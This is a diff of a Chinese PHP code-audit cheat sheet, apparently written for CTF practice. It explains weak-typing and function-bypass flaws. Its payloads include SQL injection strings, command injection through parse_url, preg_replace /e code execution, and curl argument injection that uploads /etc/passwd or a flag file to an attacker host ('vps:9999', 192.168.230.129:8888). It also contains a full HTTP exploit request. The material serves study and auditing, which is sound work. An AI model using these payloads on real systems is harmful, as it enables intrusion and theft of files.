@@ -1,13 +1,13 @@
 # **PHP代码审计备忘**
-## **1. PHP弱类型问题**
-### **int、String的转换**
+# **1. PHP弱类型问题**
+## **int、String的转换**
 ```php
 var_dump(intval(4))//4
 var_dump(intval('1asd'))//1
 var_dump(intval('asd1'))//0
 intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0
 ```
-### **比较操作符**
+## **比较操作符**
 在编程中类型转换是不可避免的一个事情，比如说网络编程中get方法或者post方法传入一个需要转换成int的值，再比如说变量间进行比较的时候，需要将变量进行转换，鉴于php是自动进行类型转换，所以会引发很多意想不到的问题。
 **“= =”与“= = =”比较操作符问题**
 php有两种比较方式,一种是“= =”一种是“= = =”这两种都可以比较两个数字的大小，但是有很明显的区别。
@@ -54,14 +54,14 @@ php在接受一个带0x的字符串的时候，会自动把这行字符串解析
 }
 ```
 布尔值可以和任何字符串相等。
-### **总结**
+## **总结**
 * 1、字符串和数字比较，字符串会被转换成数字。<br>
 * 2、混合字符串转换成数字，看字符串的第一个。<br>
 * 3、字符串开头以xex开头，x代表数字。会被转换成科学计数法（注意一定要是0e/d+的模式）。但是也有例外如：-1.3e3转换为浮点数是-1300。<br>
 * 4、0x开头的字符串会先解析成十六进制再进行比较<br>
 * 5、布尔值跟任意字符串都弱类型相等<br>
-## **2. PHP特定函数的使用绕过**
-### **strcmp绕过**
+# **2. PHP特定函数的使用绕过**
+## **strcmp绕过**
 ```php
 int strcmp ( string str1, string str1, string str2 ),
 需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1
@@ -77,7 +77,7 @@ int strcmp ( string str1, string str1, string str2 ),
 ?>
 我们传入password[]=xxx ，绕过成功。原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。
 ```
-### **利用数组绕过数值比较**
+## **利用数组绕过数值比较**
 ```php
 $AA[]='admin';
 if($AA < 9999999999){
@@ -92,7 +92,7 @@ if ((string)$AA == 0) {
 （1）无论你的数字多大，对于数值而言总是比数组小
 （2）强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为“admin”== 0 ，结果是true，直接等于0绕过即可, 即(string)$AA == 0成立
 ```
-### **is_numeric()漏洞**
+## **is_numeric()漏洞**
 ```php
 php 5.x 版本中 is_numeric 的缺陷 (php7.0 已经修复了 ), 它认为 0x…. 是整数
 比如：if(!is_numeric($page)){
@@ -103,7 +103,7 @@ php 5.x 版本中 is_numeric 的缺陷 (php7.0 已经修复了 ), 它认为 0x�
 a='1 union all select flag,flag,flag,flag from flags' binascii.hexlify(a) ——> 3120756e696f6e20616c6c2073656c65637420666c61…….
 传入page = 0x3120756…….即可绕过整数判断
 ```
-### **in_array()**
+## **in_array()**
 功能 ：检查数组中是否存在某个值
 
 定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )
@@ -113,8 +113,8 @@ a='1 union all select flag,flag,flag,flag from flags' binascii.hexlify(a) ——
 **案例**：判断 in_array(id，array(1,2,3,4)) // $strict未设置，以下payload默认强转为4，符合过滤条件，绕过
 ID = 4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))
 
-### **filter_var ： (PHP 5 >= 5.2.0, PHP 7)**
-功能 ：使用特定的过滤器过滤一个变量
+## **filter_var ： (PHP 5 >= 5.2.0, PHP 7)**
+功能 ：使用特定的过滤器过滤一个变量,如果成功，则返回已过滤的数据，如果失败，则返回 false。
 
 定义 ：mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) 所以让我们先来绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器，这里提供几个绕过方法，如下：
 
@@ -128,7 +128,7 @@ ID = 4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))
 
 PS:最后一个payload的#符号，请换成对应的url编码 %23
 
-接着要绕过 parse_url 函数，并且满足 $site_info['host'] 的值以 sec-redclub.com 结尾，payload如下：
+接着要绕过 **parse_url 函数**，并且满足 $site_info['host'] 的值以 sec-redclub.com 结尾，payload如下：
 
 http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/
 
@@ -138,8 +138,8 @@ http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.c
 
 所以我们可以换成 cat<f1agi3hEre.php 命令，即可成功获取flag
 
-### **escapeshellarg 和 escapeshellcmd**
-escapeshellarg ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号 escapeshellcmd ，会对以下的字符进行转义&#;|*?~<>^()[]{}$, x0A 和 xFF, ' 和 "仅在不配对儿的时候被转义。
+## **escapeshellarg 和 escapeshellcmd**
+escapeshellarg ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。,<br>escapeshellcmd ，会对以下的字符进行转义&#;|*?~<>^()[]{}$, x0A 和 xFF, ' 和 "仅在不配对儿的时候被转义。
 
 在字符串增加了引号同时会进行转义，那么之前的payload
 
@@ -150,9 +150,72 @@ http://127.0.0.1/index1.php?url=http://127.0.0.1' -T /etc/passwd
 http://127.0.0.1' -T /etc/passwd
 http://baidu.com/' -F file=@/etc/passwd -x vps:9999
 http://baidu.com/' -F file=@/var/www/html/flag.php -x vps:9999
-```
 
-### **parse_str**
+传入的参数是
+127.0.0.1' -v -d a=1
+由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：
+'127.0.0.1'\'' -v -d a=1'
+接着 escapeshellcmd 函数对第二步处理后字符串中的 \ 以及 a=1' 中的单引号进行转义处理，结果如下所示：
+'127.0.0.1'\\'' -v -d a=1\'
+```
+例题：
+```php
+<?php
+highlight_file(__FILE__);
+function waf($a){
+    foreach($a as $key => $value){
+        if(preg_match('/flag/i',$key)){
+            exit('are you a hacker');
+        }
+    }
+}
+foreach(array('_POST', '_GET', '_COOKIE') as $__R) {
+    if($$__R) {
+        var_dump($$__R);
+        foreach($$__R as $__k => $__v) {
+            if(isset($$__k) && $$__k == $__v) unset($$__k);
+        }
+    }
+}
+if($_POST) { waf($_POST);}
+if($_GET) { waf($_GET); }
+if($_COOKIE) { waf($_COOKIE);}
+
+if($_POST) extract($_POST, EXTR_SKIP);
+if($_GET) extract($_GET, EXTR_SKIP);
+if(isset($_GET['flag'])){
+    if($_GET['flag'] === $_GET['hongri']){
+        exit('error');
+    }
+    if(md5($_GET['flag'] ) == md5($_GET['hongri'])){
+        $url = $_GET['url'];
+        $urlInfo = parse_url($url);
+        if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){
+            die( "scheme error!");
+        }
+        $url = escapeshellarg($url);
+        $url = escapeshellcmd($url);
+        system("curl ".$url);
+    }
+}
+---------------------------------------------writeup----------------------------------------------------------
+POST /ctf/code/escapeshell.php?flag=QNKCDZO&hongri=s878926199a&url=http://baidu.com/%27%20-F%20file=@/flag%20-x%20%20192.168.230.129:8888 HTTP/1.1
+Host: 192.168.230.129
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=c18d5050ff3cd8412a328940
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+
+_GET[flag]=QNKCDZO&_GET[hongri]=s878926199a&_GET[url]=http://baidu.com/%27%20-F%20file=@/flag%20-x%20%20192.168.230.129:8888
+```
+## **parse_str**
 功能 ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。
 
 定义 ：void parse_str( string $encoded_string [, array &$result ] )
@@ -170,7 +233,7 @@ if(isset($b)){
 }
 ?>
 ```
-### **preg_replace**
+## **preg_replace**
 功能 ： 函数执行一个正则表达式的搜索和替换
 
 定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
@@ -186,7 +249,7 @@ preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}')
 preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}')
 preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value); // $regex = \S*, $value = {${phpinfo()}}
 ```
-## **3. PHP遍历覆盖问题**
+# **3. PHP遍历覆盖问题**
 **\$\$这种写法称为可变变量:**<br>
 一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。<br>
 **extract()函数使用不当:**<br>
